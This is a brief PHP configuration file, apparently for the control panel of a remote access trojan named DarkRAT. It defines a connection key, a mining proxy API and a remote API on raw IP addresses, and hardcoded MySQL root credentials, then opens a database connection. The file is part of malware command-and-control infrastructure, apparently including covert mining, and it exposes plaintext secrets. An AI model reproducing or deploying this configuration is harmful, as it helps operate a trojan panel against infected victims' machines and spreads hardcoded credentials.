<?php
// https://chrome.google.com/webstore/detail/darkrat-switcher-and-mana/kgpcibmopifimfphmpeadhefbedfkhpm

$config = array(
    "connectionkey" => "otO3BA0&_YwGh5y966sfpW#mC_uIRMV#",
    "miningProxyApi" => "http://31.214.240.105:8088",
    "apiurl" => "http://91.200.100.153/projects/darkrat/API/",
    "dbhost" => "localhost",
    "dbuser" => "root",
    "dbpass" => "hobbit36",
    "dbname" => "darkrat2",
);

$odb = new PDO("mysql:host=".$config['dbhost'].";dbname=".$config["dbname"], $config["dbuser"], $config["dbpass"]);


?>